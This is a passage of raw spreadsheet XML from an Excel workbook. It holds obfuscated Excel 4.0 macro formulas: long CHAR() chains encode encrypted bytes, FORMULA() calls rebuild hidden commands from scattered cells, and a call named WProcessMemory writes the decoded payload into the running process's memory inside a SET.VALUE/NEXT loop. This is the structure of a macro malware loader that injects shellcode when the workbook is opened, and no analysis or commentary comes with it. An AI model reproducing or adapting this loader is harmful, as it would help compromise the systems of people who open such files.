&amp;CHAR(175)&amp;CHAR(76)&amp;CHAR(170)&amp;CHAR(48)&amp;CHAR(72)&amp;CHAR(5)&amp;CHAR(70)&amp;CHAR(101)&amp;CHAR(175)&amp;CHAR(24)&amp;CHAR(163)&amp;CHAR(219)&amp;CHAR(42)&amp;CHAR(156)&amp;CHAR(54)&amp;CHAR(190)&amp;CHAR(211)&amp;CHAR(213)&amp;CHAR(230)&amp;CHAR(133)&amp;CHAR(238)&amp;CHAR(225)&amp;CHAR(148)&amp;CHAR(41)&amp;CHAR(154)&amp;CHAR(48)&amp;CHAR(32)&amp;CHAR(90)&amp;CHAR(112)&amp;CHAR(233)&amp;CHAR(133)&amp;CHAR(156)&amp;CHAR(112)&amp;CHAR(193)&amp;CHAR(52)&amp;CHAR(205)&amp;CHAR(201)&amp;CHAR(60)&amp;CHAR(124)&amp;CHAR(180)&amp;CHAR(123)&amp;CHAR(83)&amp;CHAR(93)&amp;CHAR(139)&amp;CHAR(207)&amp;CHAR(143)&amp;CHAR(143)&amp;CHAR(153)&amp;CHAR(35)&amp;CHAR(9)&amp;CHAR(116)&amp;CHAR(158)&amp;CHAR(57)&amp;CHAR(11)&amp;CHAR(69)&amp;CHAR(206)&amp;CHAR(173)</f>
        <v>âò¾8¡¢¤LÛUi”ü_x0013_`ÌWÞé¯·1Ù_x0019_Jè§6R7ÚxV%_x0007_Ç8}äk‡n_ÊYpó!ÁkoTYÚ‡¬û‡É„cê¦×¦á_x0003_‚û¤_x0018_±_x0005_LCh,h—ÊÌTó_x0002_Íó± 9ýûº¿=Pˆê—~o÷´,_x0015_Ç9`,R6{M_x0004_7¾¸qö_x0015_®5&lt;dß¹8$úCâÕN^3_x0015_Á&amp;”²Q_x0010_­J«àÛØêƒoÒ‡æ¥:&lt;Åó¢ºþJNë£ñØbî\_x001B__ÙÝ'¤«ô_x001C_l_x0008_†u0rƒÎ2×á.RÚ}ú¯Lª0H_x0005_Fe¯_x0018_£Û*œ6¾ÓÕæ…îá”)š0 Zpé…œpÁ4ÍÉ&lt;|´{S]‹Ï™#	tž9_x000B_EÎ­</v>
      </c>
      <c r="DG15" t="str">
        <f>CHAR(227)&amp;CHAR(30)&amp;CHAR(210)&amp;CHAR(59)&amp;CHAR(245)&amp;CHAR(190)&amp;CHAR(14)&amp;CHAR(9)&amp;CHAR(151)&amp;CHAR(85)</f>
        <v>ã_x001E_Ò;õ¾_x000E_	—U</v>
      </c>
      <c r="DH15" t="s">
        <v>14</v>
      </c>
      <c r="DJ15" t="b">
        <f>WProcessMemory(-1,$DJ$10+($DI$1*255),main,LEN(main),0)</f>
        <v>0</v>
      </c>
    </row>
    <row r="16" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE16" t="b">
        <f>FORMULA(DH65&amp;DH45&amp;DH31&amp;DH46&amp;DH71&amp;DH48&amp;DH27&amp;DH38&amp;DH47&amp;DH31&amp;DH66&amp;DH44&amp;DH54&amp;DH29&amp;DH54&amp;DH54&amp;DH56&amp;DH76&amp;DH44&amp;DH54&amp;DH29&amp;DH54&amp;DH54&amp;DH56&amp;DH72&amp;DH54&amp;DH67,DJ16)</f>
        <v>1</v>
      </c>
      <c r="DF16" t="str">
        <f>CHAR(228)&amp;CHAR(192)&amp;CHAR(61)&amp;CHAR(47)&amp;CHAR(43)&amp;CHAR(49)&amp;CHAR(96)&amp;CHAR(72)&amp;CHAR(242)&amp;CHAR(116)&amp;CHAR(220)&amp;CHAR(149)&amp;CHAR(36)&amp;CHAR(53)&amp;CHAR(180)&amp;CHAR(85)&amp;CHAR(32)&amp;CHAR(58)&amp;CHAR(251)&amp;CHAR(160)&amp;CHAR(207)&amp;CHAR(64)&amp;CHAR(149)&amp;CHAR(186)&amp;CHAR(208)&amp;CHAR(44)&amp;CHAR(107)&amp;CHAR(92)&amp;CHAR(110)&amp;CHAR(119)&amp;CHAR(25)&amp;CHAR(108)&amp;CHAR(175)&amp;CHAR(237)&amp;CHAR(14)&amp;CHAR(198)&amp;CHAR(93)&amp;CHAR(255)&amp;CHAR(63)&amp;CHAR(115)&amp;CHAR(189)&amp;CHAR(104)&amp;CHAR(148)&amp;CHAR(140)&amp;CHAR(113)&amp;CHAR(39)&amp;CHAR(210)&amp;CHAR(217)&amp;CHAR(156)&amp;CHAR(48)&amp;CHAR(9)&amp;CHAR(17)&amp;CHAR(154)&amp;CHAR(11)&amp;CHAR(141)&amp;CHAR(223)&amp;CHAR(162)&amp;CHAR(50)&amp;CHAR(223)&amp;CHAR(215)&amp;CHAR(176)&amp;CHAR(155)&amp;CHAR(129)&amp;CHAR(143)&amp;CHAR(235)&amp;CHAR(63)&amp;CHAR(74)&amp;CHAR(77)&amp;CHAR(196)&amp;CHAR(198)&amp;CHAR(92)&amp;CHAR(31)&amp;CHAR(11)&amp;CHAR(252)&amp;CHAR(138)&amp;CHAR(181)&amp;CHAR(233)&amp;CHAR(96)&amp;CHAR(112)&amp;CHAR(114)&amp;CHAR(124)&amp;CHAR(62)&amp;CHAR(213)&amp;CHAR(84)&amp;CHAR(200)&amp;CHAR(218)&amp;CHAR(214)&amp;CHAR(42)&amp;CHAR(128)&amp;CHAR(21)&amp;CHAR(244)&amp;CHAR(57)&amp;CHAR(23)&amp;CHAR(59)&amp;CHAR(118)&amp;CHAR(250)&amp;CHAR(127)&amp;CHAR(58)&amp;CHAR(4)&amp;CHAR(245)&amp;CHAR(233)&amp;CHAR(84)&amp;CHAR(60)&amp;CHAR(122)&amp;CHAR(166)&amp;CHAR(94)&amp;CHAR(244)&amp;CHAR(131)&amp;CHAR(255)&amp;CHAR(9)&amp;CHAR(88)&amp;CHAR(123)&amp;CHAR(248)&amp;CHAR(218)&amp;CHAR(16)&amp;CHAR(25)&amp;CHAR(141)&amp;CHAR(18)&amp;CHAR(154)&amp;CHAR(172)&amp;CHAR(145)&amp;CHAR(84)&amp;CHAR(213)&amp;CHAR(16)&amp;CHAR(228)&amp;CHAR(70)&amp;CHAR(132)&amp;CHAR(119)&amp;CHAR(164)&amp;CHAR(187)&amp;CHAR(64)&amp;CHAR(81)&amp;CHAR(213)&amp;CHAR(189)&amp;CHAR(94)&amp;CHAR(36)&amp;CHAR(79)&amp;CHAR(44)&amp;CHAR(26)&amp;CHAR(61)&amp;CHAR(187)&amp;CHAR(91)&amp;CHAR(97)&amp;CHAR(188)&amp;CHAR(31)&amp;CHAR(183)&amp;CHAR(152)&amp;CHAR(136)&amp;CHAR(53)&amp;CHAR(23)&amp;CHAR(127)&amp;CHAR(174)&amp;CHAR(107)&amp;CHAR(75)&amp;CHAR(221)&amp;CHAR(203)&amp;CHAR(65)&amp;CHAR(61)&amp;CHAR(154)&amp;CHAR(216)&amp;CHAR(226)&amp;CHAR(228)&amp;CHAR(213)&amp;CHAR(34)&amp;CHAR(135)&amp;CHAR(82)&amp;CHAR(217)&amp;CHAR(90)&amp;CHAR(158)&amp;CHAR(177)&amp;CHAR(116)&amp;CHAR(192)&amp;CHAR(172)&amp;CHAR(93)&amp;CHAR(220)&amp;CHAR(245)&amp;CHAR(159)&amp;CHAR(76)&amp;CHAR(194)&amp;CHAR(54)&amp;CHAR(247)&amp;CHAR(236)&amp;CHAR(202)&amp;CHAR(244)&amp;CHAR(106)&amp;CHAR(135)&amp;CHAR(127)&amp;CHAR(59)&amp;CHAR(111)&amp;CHAR(196)&amp;CHAR(74)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(185)&amp;CHAR(77)&amp;CHAR(94)&amp;CHAR(54)&amp;CHAR(138)&amp;CHAR(137)&amp;CHAR(196)&amp;CHAR(52)&amp;CHAR(151)&amp;CHAR(234)&amp;CHAR(131)&amp;CHAR(202)&amp;CHAR(202)&amp;CHAR(182)&amp;CHAR(234)&amp;CHAR(251)&amp;CHAR(43)&amp;CHAR(37)&amp;CHAR(67)&amp;CHAR(134)&amp;CHAR(60)&amp;CHAR(49)&amp;CHAR(55)&amp;CHAR(217)&amp;CHAR(173)&amp;CHAR(185)&amp;CHAR(17)&amp;CHAR(184)&amp;CHAR(64)&amp;CHAR(156)&amp;CHAR(78)&amp;CHAR(57)&amp;CHAR(53)&amp;CHAR(77)&amp;CHAR(183)&amp;CHAR(242)&amp;CHAR(159)&amp;CHAR(30)&amp;CHAR(183)&amp;CHAR(165)&amp;CHAR(148)&amp;CHAR(179)&amp;CHAR(104)&amp;CHAR(250)&amp;CHAR(48)&amp;CHAR(179)&amp;CHAR(225)&amp;CHAR(163)&amp;CHAR(184)&amp;CHAR(180)&amp;CHAR(186)&amp;CHAR(1)&amp;CHAR(20)&amp;CHAR(107)&amp;CHAR(224)&amp;CHAR(131)&amp;CHAR(201)&amp;CHAR(52)&amp;CHAR(238)&amp;CHAR(134)&amp;CHAR(123)&amp;CHAR(30)</f>
        <v>äÀ=/+1`HòtÜ•$5´U :û Ï@•ºÐ,k\nw_x0019_l¯í_x000E_Æ]ÿ?s½h”Œq'ÒÙœ0	_x0011_š_x000B_ß¢2ß×°›ë?JMÄÆ\_x001F__x000B_üŠµé`pr|&gt;ÕTÈÚÖ*€_x0015_ô9_x0017_;vú:_x0004_õéT&lt;z¦^ôƒÿ	X{øÚ_x0010__x0019__x0012_š¬‘TÕ_x0010_äF„w¤»@QÕ½^$O,_x001A_=»[a¼_x001F_·˜ˆ5_x0017_®kKÝËA=šØâäÕ"‡RÙZž±tÀ¬]ÜõŸLÂ6÷ìÊôj‡;oÄJ_x0003__x0006_¹M^6Š‰Ä4—êƒÊÊ¶êû+%C†&lt;17Ù­¹_x0011_¸@œN95M·òŸ_x001E_·¥”³hú0³á£¸´º_x0001__x0014_kàƒÉ4î†{_x001E_</v>
      </c>
      <c r="DG16" t="str">
        <f>CHAR(173)&amp;CHAR(16)&amp;CHAR(157)&amp;CHAR(121)&amp;CHAR(13)&amp;CHAR(151)&amp;CHAR(122)&amp;CHAR(80)&amp;CHAR(217)&amp;CHAR(204)</f>
        <v>­_x0010_y_x000D_—zPÙÌ</v>
      </c>
      <c r="DH16" t="s">
        <v>15</v>
      </c>
      <c r="DJ16" t="b">
        <f>SET.VALUE($DI$1,$DI$1+1)</f>
        <v>0</v>
      </c>
    </row>
    <row r="17" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE17" t="b">
        <f>FORMULA(DH13&amp;DH1&amp;DH9&amp;DH14&amp;DH65&amp;DH27&amp;DH28&amp;DH45&amp;DH44&amp;DH31&amp;DH32&amp;DH66&amp;DH68&amp;DH44&amp;DH63&amp;DH54&amp;DH64&amp;DH29&amp;DH68&amp;DH76&amp;DH13&amp;DH1&amp;DH9&amp;DH14&amp;DH67,DJ17)</f>
        <v>1</v>
      </c>
      <c r="DF17" t="str">
        <f>CHAR(49)&amp;CHAR(136)&amp;CHAR(117)&amp;CHAR(12)&amp;CHAR(227)&amp;CHAR(203)&amp;CHAR(160)&amp;CHAR(243)&amp;CHAR(36)&amp;CHAR(196)&amp;CHAR(166)&amp;CHAR(160)&amp;CHAR(67)&amp;CHAR(3)&amp;CHAR(71)&amp;CHAR(179)&amp;CHAR(207)&amp;CHAR(248)&amp;CHAR(147)&amp;CHAR(230)&amp;CHAR(172)&amp;CHAR(157)&amp;CHAR(175)&amp;CHAR(254)&amp;CHAR(235)&amp;CHAR(82)&amp;CHAR(49)&amp;CHAR(53)&amp;CHAR(6)&amp;CHAR(129)&amp;CHAR(140)&amp;CHAR(209)&amp;CHAR(131)&amp;CHAR(34)&amp;CHAR(190)&amp;CHAR(23)&amp;CHAR(139)&amp;CHAR(101)&amp;CHAR(201)&amp;CHAR(181)&amp;CHAR(91)&amp;CHAR(129)&amp;CHAR(148)&amp;CHAR(114)&amp;CHAR(75)&amp;CHAR(148)&amp;CHAR(51)&amp;CHAR(84)&amp;CHAR(174)&amp;CHAR(134)&amp;CHAR(126)&amp;CHAR(162)&amp;CHAR(148)&amp;CHAR(199)&amp;CHAR(217)&amp;CHAR(85)&amp;CHAR(105)&amp;CHAR(234)&amp;CHAR(124)&amp;CHAR(77)&amp;CHAR(127)&amp;CHAR(162)&amp;CHAR(214)&amp;CHAR(147)&amp;CHAR(251)&amp;CHAR(185)&amp;CHAR(103)&amp;CHAR(60)&amp;CHAR(118)&amp;CHAR(20)&amp;CHAR(102)&amp;CHAR(190)&amp;CHAR(14)&amp;CHAR(70)&amp;CHAR(74)&amp;CHAR(2)&amp;CHAR(210)&amp;CHAR(196)&amp;CHAR(167)&amp;CHAR(69)&amp;CHAR(64)&amp;CHAR(22)&amp;CHAR(118)&amp;CHAR(175)&amp;CHAR(188)&amp;CHAR(213)&amp;CHAR(224)&amp;CHAR(20)&amp;CHAR(190)&amp;CHAR(34)&amp;CHAR(73)&amp;CHAR(86)&amp;CHAR(30)&amp;CHAR(30)&amp;CHAR(91)&amp;CHAR(172)&amp;CHAR(160)&amp;CHAR(182)&amp;CHAR(186)&amp;CHAR(109)&amp;CHAR(76)&amp;CHAR(238)&amp;CHAR(236)&amp;CHAR(55)&amp;CHAR(238)&amp;CHAR(176)&amp;CHAR(153)&amp;CHAR(53)&amp;CHAR(236)&amp;CHAR(151)&amp;CHAR(148)&amp;CHAR(151)&amp;CHAR(4)&amp;CHAR(205)&amp;CHAR(242)&amp;CHAR(105)&amp;CHAR(199)&amp;CHAR(64)&amp;CHAR(175)&amp;CHAR(155)&amp;CHAR(34)&amp;CHAR(125)&amp;CHAR(80)&amp;CHAR(193)&amp;CHAR(104)&amp;CHAR(227)&amp;CHAR(183)&amp;CHAR(15)&amp;CHAR(173)&amp;CHAR(153)&amp;CHAR(25)&amp;CHAR(9)&amp;CHAR(189)&amp;CHAR(195)&amp;CHAR(169)&amp;CHAR(128)&amp;CHAR(9)&amp;CHAR(241)&amp;CHAR(72)&amp;CHAR(5)&amp;CHAR(38)&amp;CHAR(73)&amp;CHAR(117)&amp;CHAR(156)&amp;CHAR(136)&amp;CHAR(12)&amp;CHAR(142)&amp;CHAR(74)&amp;CHAR(77)&amp;CHAR(245)&amp;CHAR(6)&amp;CHAR(92)&amp;CHAR(49)&amp;CHAR(179)&amp;CHAR(206)&amp;CHAR(124)&amp;CHAR(225)&amp;CHAR(101)&amp;CHAR(245)&amp;CHAR(137)&amp;CHAR(197)&amp;CHAR(157)&amp;CHAR(172)&amp;CHAR(43)&amp;CHAR(168)&amp;CHAR(93)&amp;CHAR(80)&amp;CHAR(91)&amp;CHAR(138)&amp;CHAR(205)&amp;CHAR(37)&amp;CHAR(93)&amp;CHAR(69)&amp;CHAR(209)&amp;CHAR(47)&amp;CHAR(250)&amp;CHAR(148)&amp;CHAR(84)&amp;CHAR(200)&amp;CHAR(220)&amp;CHAR(230)&amp;CHAR(119)&amp;CHAR(179)&amp;CHAR(162)&amp;CHAR(254)&amp;CHAR(37)&amp;CHAR(151)&amp;CHAR(223)&amp;CHAR(79)&amp;CHAR(96)&amp;CHAR(60)&amp;CHAR(62)&amp;CHAR(243)&amp;CHAR(224)&amp;CHAR(75)&amp;CHAR(88)&amp;CHAR(219)&amp;CHAR(64)&amp;CHAR(231)&amp;CHAR(80)&amp;CHAR(209)&amp;CHAR(103)&amp;CHAR(199)&amp;CHAR(64)&amp;CHAR(108)&amp;CHAR(176)&amp;CHAR(180)&amp;CHAR(37)&amp;CHAR(238)&amp;CHAR(148)&amp;CHAR(224)&amp;CHAR(253)&amp;CHAR(18)&amp;CHAR(68)&amp;CHAR(186)&amp;CHAR(121)&amp;CHAR(141)&amp;CHAR(240)&amp;CHAR(235)&amp;CHAR(192)&amp;CHAR(27)&amp;CHAR(149)&amp;CHAR(4)&amp;CHAR(10)&amp;CHAR(167)&amp;CHAR(71)&amp;CHAR(166)&amp;CHAR(116)&amp;CHAR(69)&amp;CHAR(133)&amp;CHAR(137)&amp;CHAR(182)&amp;CHAR(187)&amp;CHAR(149)&amp;CHAR(150)&amp;CHAR(132)&amp;CHAR(153)&amp;CHAR(195)&amp;CHAR(177)&amp;CHAR(77)&amp;CHAR(97)&amp;CHAR(192)&amp;CHAR(67)&amp;CHAR(59)&amp;CHAR(211)&amp;CHAR(108)&amp;CHAR(5)&amp;CHAR(98)&amp;CHAR(86)&amp;CHAR(168)&amp;CHAR(63)&amp;CHAR(142)&amp;CHAR(217)&amp;CHAR(247)&amp;CHAR(165)</f>
        <v>1ˆu_x000C_ãË ó$Ä¦ C_x0003_G³Ïø“æ¬¯þëR15_x0006_ŒÑƒ"¾_x0017_‹eÉµ[”rK”3T®†~¢”ÇÙUiê|M¢Ö“û¹g&lt;v_x0014_f¾_x000E_FJ_x0002_ÒÄ§E@_x0016_v¯¼Õà_x0014_¾"IV_x001E__x001E_[¬ ¶ºmLîì7î°™5ì—”—_x0004_ÍòiÇ@¯›"}PÁhã·_x000F_­™_x0019_	½Ã©€	ñH_x0005_&amp;Iuœˆ_x000C_ŽJMõ_x0006_\1³Î|áeõ‰Å¬+¨]P[ŠÍ%]EÑ/ú”TÈÜæw³¢þ%—ßO`&lt;&gt;óàKXÛ@çPÑgÇ@l°´%î”àý_x0012_DºyðëÀ_x001B_•_x0004_
§G¦tE…‰¶»•–„™Ã±MaÀC;Ól_x0005_bV¨?ŽÙ÷¥</v>
      </c>
      <c r="DG17" t="str">
        <f>CHAR(152)&amp;CHAR(191)&amp;CHAR(49)&amp;CHAR(9)&amp;CHAR(73)&amp;CHAR(85)&amp;CHAR(99)&amp;CHAR(23)&amp;CHAR(60)&amp;CHAR(61)</f>
        <v>˜¿1	IUc_x0017_&lt;=</v>
      </c>
      <c r="DH17" t="s">
        <v>16</v>
      </c>
      <c r="DJ17" t="b">
        <f bx="1">main=ABSREF("R[1]C",main)</f>
        <v>0</v>
      </c>
    </row>
    <row r="18" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE18" t="b">
        <f>FORMULA(DH65&amp;DH40&amp;DH31&amp;DH50&amp;DH46&amp;DH66&amp;DH67,DJ18)</f>
        <v>1</v>
      </c>
      <c r="DF18" t="str">
        <f>CHAR(245)&amp;CHAR(177)&amp;CHAR(69)&amp;CHAR(15)&amp;CHAR(106)&amp;CHAR(10)&amp;CHAR(156)&amp;CHAR(116)&amp;CHAR(43)&amp;CHAR(181)&amp;CHAR(164)&amp;CHAR(176)&amp;CHAR(255)&amp;CHAR(38)&amp;CHAR(194)&amp;CHAR(71)&amp;CHAR(65)&amp;CHAR(68)&amp;CHAR(188)&amp;CHAR(148)&amp;CHAR(62)&amp;CHAR(184)&amp;CHAR(209)&amp;CHAR(174)&amp;CHAR(173)&amp;CHAR(213)&amp;CHAR(63)&amp;CHAR(82)&amp;CHAR(201)&amp;CHAR(125)&amp;CHAR(18)&amp;CHAR(130)&amp;CHAR(52)&amp;CHAR(39)&amp;CHAR(208)&amp;CHAR(173)&amp;CHAR(130)&amp;CHAR(5)&amp;CHAR(86)&amp;CHAR(119)&amp;CHAR(253)&amp;CHAR(182)&amp;CHAR(219)&amp;CHAR(139)&amp;CHAR(193)&amp;CHAR(221)&amp;CHAR(1)&amp;CHAR(140)&amp;CHAR(219)&amp;CHAR(112)&amp;CHAR(127)&amp;CHAR(17)&amp;CHAR(155)&amp;CHAR(117)&amp;CHAR(44)&amp;CHAR(188)&amp;CHAR(184)&amp;CHAR(103)&amp;CHAR(194)&amp;CHAR(178)&amp;CHAR(157)&amp;CHAR(125)&amp;CHAR(131)&amp;CHAR(192)&amp;CHAR(22)&amp;CHAR(144)&amp;CHAR(50)&amp;CHAR(60)&amp;CHAR(241)&amp;CHAR(239)&amp;CHAR(16)&amp;CHAR(214)&amp;CHAR(242)&amp;CHAR(63)&amp;CHAR(175)&amp;CHAR(105)&amp;CHAR(36)&amp;CHAR(109)&amp;CHAR(33)&amp;CHAR(55)&amp;CHAR(34)&amp;CHAR(124)&amp;CHAR(102)&amp;CHAR(93)&amp;CHAR(200)&amp;CHAR(98)&amp;CHAR(88)&amp;CHAR(205)&amp;CHAR(99)&amp;CHAR(142)&amp;CHAR(241)&amp;CHAR(83)&amp;CHAR(81)&amp;CHAR(168)&amp;CHAR(173)&amp;CHAR(45)&amp;CHAR(25)&amp;CHAR(248)&amp;CHAR(203)&amp;CHAR(254)&amp;CHAR(197)&amp;CHAR(69)&amp;CHAR(164)&amp;CHAR(147)&amp;CHAR(122)&amp;CHAR(178)&amp;CHAR(77)&amp;CHAR(124)&amp;CHAR(20)&amp;CHAR(6)&amp;CHAR(169)&amp;CHAR(13)&amp;CHAR(80)&amp;CHAR(41)&amp;CHAR(233)&amp;CHAR(142)&amp;CHAR(191)&amp;CHAR(172)&amp;CHAR(96)&amp;CHAR(157)&amp;CHAR(42)&amp;CHAR(85)&amp;CHAR(134)&amp;CHAR(169)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(165)&amp;CHAR(8)&amp;CHAR(38)&amp;CHAR(85)&amp;CHAR(238)&amp;CHAR(216)&amp;CHAR(245)&amp;CHAR(155)&amp;CHAR(49)&amp;CHAR(149)&amp;CHAR(147)&amp;CHAR(60)&amp;CHAR(79)&amp;CHAR(203)&amp;CHAR(177)&amp;CHAR(78)&amp;CHAR(6)&amp;CHAR(172)&amp;CHAR(225)&amp;CHAR(108)&amp;CHAR(53)&amp;CHAR(234)&amp;CHAR(214)&amp;CHAR(61)&amp;CHAR(252)&amp;CHAR(49)&amp;CHAR(139)&amp;CHAR(178)&amp;CHAR(185)&amp;CHAR(85)&amp;CHAR(155)&amp;CHAR(83)&amp;CHAR(120)&amp;CHAR(43)&amp;CHAR(73)&amp;CHAR(200)&amp;CHAR(50)&amp;CHAR(246)&amp;CHAR(213)&amp;CHAR(200)&amp;CHAR(180)&amp;CHAR(81)&amp;CHAR(250)&amp;CHAR(70)&amp;CHAR(224)&amp;CHAR(80)&amp;CHAR(103)&amp;CHAR(85)&amp;CHAR(127)&amp;CHAR(84)&amp;CHAR(218)&amp;CHAR(118)&amp;CHAR(134)&amp;CHAR(49)&amp;CHAR(103)&amp;CHAR(5)&amp;CHAR(125)&amp;CHAR(130)&amp;CHAR(37)&amp;CHAR(44)&amp;CHAR(119)&amp;CHAR(199)&amp;CHAR(196)&amp;CHAR(14)&amp;CHAR(102)&amp;CHAR(72)&amp;CHAR(145)&amp;CHAR(197)&amp;CHAR(76)&amp;CHAR(203)&amp;CHAR(108)&amp;CHAR(2)&amp;CHAR(107)&amp;CHAR(73)&amp;CHAR(130)&amp;CHAR(178)&amp;CHAR(189)&amp;CHAR(75)&amp;CHAR(95)&amp;CHAR(191)&amp;CHAR(203)&amp;CHAR(57)&amp;CHAR(98)&amp;CHAR(31)&amp;CHAR(57)&amp;CHAR(151)&amp;CHAR(226)&amp;CHAR(108)&amp;CHAR(251)&amp;CHAR(100)&amp;CHAR(49)&amp;CHAR(15)&amp;CHAR(47)&amp;CHAR(239)&amp;CHAR(170)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(231)&amp;CHAR(26)&amp;CHAR(58)&amp;CHAR(7)&amp;CHAR(25)&amp;CHAR(238)&amp;CHAR(107)&amp;CHAR(190)&amp;CHAR(122)&amp;CHAR(222)&amp;CHAR(216)&amp;CHAR(182)&amp;CHAR(146)&amp;CHAR(1)&amp;CHAR(188)&amp;CHAR(103)&amp;CHAR(234)&amp;CHAR(70)&amp;CHAR(3)&amp;CHAR(195)&amp;CHAR(70)&amp;CHAR(106)&amp;CHAR(190)&amp;CHAR(100)&amp;CHAR(154)&amp;CHAR(38)&amp;CHAR(159)&amp;CHAR(171)&amp;CHAR(225)&amp;CHAR(109)&amp;CHAR(120)&amp;CHAR(41)</f>
        <v>õ±E_x000F_j
œt+µ¤°ÿ&amp;ÂGAD¼”&gt;¸Ñ®­Õ?RÉ}_x0012_‚4'Ð­‚_x0005_Vwý¶Û‹ÁÝ_x0001_ŒÛp_x0011_›u,¼¸gÂ²}ƒÀ_x0016_2&lt;ñï_x0010_Öò?¯i$m!7"|f]ÈbXÍcŽñSQ¨­-_x0019_øËþÅE¤“z²M|_x0014__x0006_©_x000D_P)éŽ¿¬`*U†©_x0002__x000F_¥_x0008_&amp;UîØõ›1•“&lt;OË±N_x0006_¬ál5êÖ=ü1‹²¹U›Sx+IÈ2öÕÈ´QúFàPgUTÚv†1g_x0005_}‚%,wÇÄ_x000E_fH‘ÅLËl_x0002_kI‚²½K_¿Ë9b_x001F_9—âlûd1_x000F_/ïª÷ýç_x001A_:_x0007__x0019_îk¾zÞØ¶’_x0001_¼gêF_x0003_ÃFj¾dš&amp;Ÿ«ámx)</v>
      </c>
      <c r="DG18" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(84)&amp;CHAR(217)&amp;CHAR(140)&amp;CHAR(229)&amp;CHAR(194)&amp;CHAR(65)&amp;CHAR(31)</f>
        <v>Ê|ŸTÙŒåÂA_x001F_</v>
      </c>
      <c r="DH18" t="s">
        <v>17</v>
      </c>
      <c r="DJ18" t="b">
        <f>NEXT()</f>
        <v>0</v>
      </c>
    </row>
    <row r="19" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE19" t="b">
        <f>FORMULA(DH65&amp;DH29&amp;DH46&amp;DH8&amp;DH18&amp;DH5&amp;DH1&amp;DH4&amp;DH66&amp;DH53&amp;DH76&amp;DH53&amp;DH76&amp;DH44&amp;DH54&amp;DH53&amp;DH29&amp;DH54&amp;DH54&amp;DH57&amp;DH76&amp;DH53&amp;DH76&amp;DH53&amp;DH76&amp;DH53&amp;DH67,DJ19)</f>
        <v>1</v>
      </c>
      <c r="DF19" t="str">
        <f>CHAR(173)&amp;CHAR(123)&amp;CHAR(138)&amp;CHAR(135)&amp;CHAR(172)&amp;CHAR(160)&amp;CHAR(29)&amp;CHAR(144)&amp;CHAR(32)&amp;CHAR(184)&amp;CHAR(70)&amp;CHAR(95)&amp;CHAR(83)&amp;CHAR(116)&amp;CHAR(215)&amp;CHAR(227)&amp;CHAR(5)&amp;CHAR(56)&amp;CHAR(87)&amp;CHAR(141)&amp;CHAR(94)&amp;CHAR(5)&amp;CHAR(193)&amp;CHAR(247)&amp;CHAR(118)&amp;CHAR(157)&amp;CHAR(179)&amp;CHAR(82)&amp;CHAR(31)&amp;CHAR(215)&amp;CHAR(115)&amp;CHAR(185)&amp;CHAR(176)&amp;CHAR(200)&amp;CHAR(2)&amp;CHAR(43)&amp;CHAR(164)&amp;CHAR(142)&amp;CHAR(97)&amp;CHAR(207)&amp;CHAR(239)&amp;CHAR(32)&amp;CHAR(133)&amp;CHAR(230)&amp;CHAR(248)&amp;CHAR(120)&amp;CHAR(198)&amp;CHAR(168)&amp;CHAR(148)&amp;CHAR(216)&amp;CHAR(247)&amp;CHAR(112)&amp;CHAR(40)&amp;CHAR(227)&amp;CHAR(80)&amp;CHAR(29)&amp;CHAR(241)&amp;CHAR(229)&amp;CHAR(137)&amp;CHAR(253)&amp;CHAR(164)&amp;CHAR(216)&amp;CHAR(229)&amp;CHAR(243)&amp;CHAR(22)&amp;CHAR(251)&amp;CHAR(1)&amp;CHAR(90)&amp;CHAR(191)&amp;CHAR(104)&amp;CHAR(244)&amp;CHAR(142)&amp;CHAR(17)&amp;CHAR(125)&amp;CHAR(30)&amp;CHAR(101)&amp;CHAR(236)&amp;CHAR(219)&amp;CHAR(25)&amp;CHAR(241)&amp;CHAR(222)&amp;CHAR(252)&amp;CHAR(194)&amp;CHAR(146)&amp;CHAR(106)&amp;CHAR(141)&amp;CHAR(237)&amp;CHAR(241)&amp;CHAR(134)&amp;CHAR(240)&amp;CHAR(123)&amp;CHAR(152)&amp;CHAR(55)&amp;CHAR(76)&amp;CHAR(168)&amp;CHAR(171)&amp;CHAR(15)&amp;CHAR(247)&amp;CHAR(189)&amp;CHAR(54)&amp;CHAR(69)&amp;CHAR(78)&amp;CHAR(76)&amp;CHAR(187)&amp;CHAR(115)&amp;CHAR(121)&amp;CHAR(189)&amp;CHAR(79)&amp;CHAR(202)&amp;CHAR(143)&amp;CHAR(90)&amp;CHAR(37)&amp;CHAR(24)&amp;CHAR(235)&amp;CHAR(102)&amp;CHAR(5)&amp;CHAR(114)&amp;CHAR(145)&amp;CHAR(85)&amp;CHAR(243)&amp;CHAR(65)&amp;CHAR(178)&amp;CHAR(209)&amp;CHAR(189)&amp;CHAR(219)&amp;CHAR(192)&amp;CHAR(2)&amp;CHAR(146)&amp;CHAR(145)&amp;CHAR(45)&amp;CHAR(102)&amp;CHAR(133)&amp;CHAR(9)&amp;CHAR(88)&amp;CHAR(159)&amp;CHAR(52)&amp;CHAR(104)&amp;CHAR(199)&amp;CHAR(153)&amp;CHAR(103)&amp;CHAR(248)&amp;CHAR(195)&amp;CHAR(54)&amp;CHAR(25)&amp;CHAR(64)&amp;CHAR(142)&amp;CHAR(127)&amp;CHAR(132)&amp;CHAR(153)&amp;CHAR(89)&amp;CHAR(235)&amp;CHAR(41)&amp;CHAR(201)&amp;CHAR(25)&amp;CHAR(253)&amp;CHAR(3)&amp;CHAR(124)&amp;CHAR(161)&amp;CHAR(79)&amp;CHAR(253)&amp;CHAR(235)&amp;CHAR(3)&amp;CHAR(107)&amp;CHAR(182)&amp;CHAR(176)&amp;CHAR(92)&amp;CHAR(21)&amp;CHAR(42)&amp;CHAR(167)&amp;CHAR(236)&amp;CHAR(48)&amp;CHAR(139)&amp;CHAR(9)&amp;CHAR(191)&amp;CHAR(206)&amp;CHAR(243)&amp;CHAR(81)&amp;CHAR(164)&amp;CHAR(123)&amp;CHAR(140)&amp;CHAR(22)&amp;CHAR(115)&amp;CHAR(111)&amp;CHAR(110)&amp;CHAR(90)&amp;CHAR(185)&amp;CHAR(156)&amp;CHAR(195)&amp;CHAR(61)&amp;CHAR(54)&amp;CHAR(100)&amp;CHAR(210)&amp;CHAR(196)&amp;CHAR(222)&amp;CHAR(128)&amp;CHAR(160)&amp;CHAR(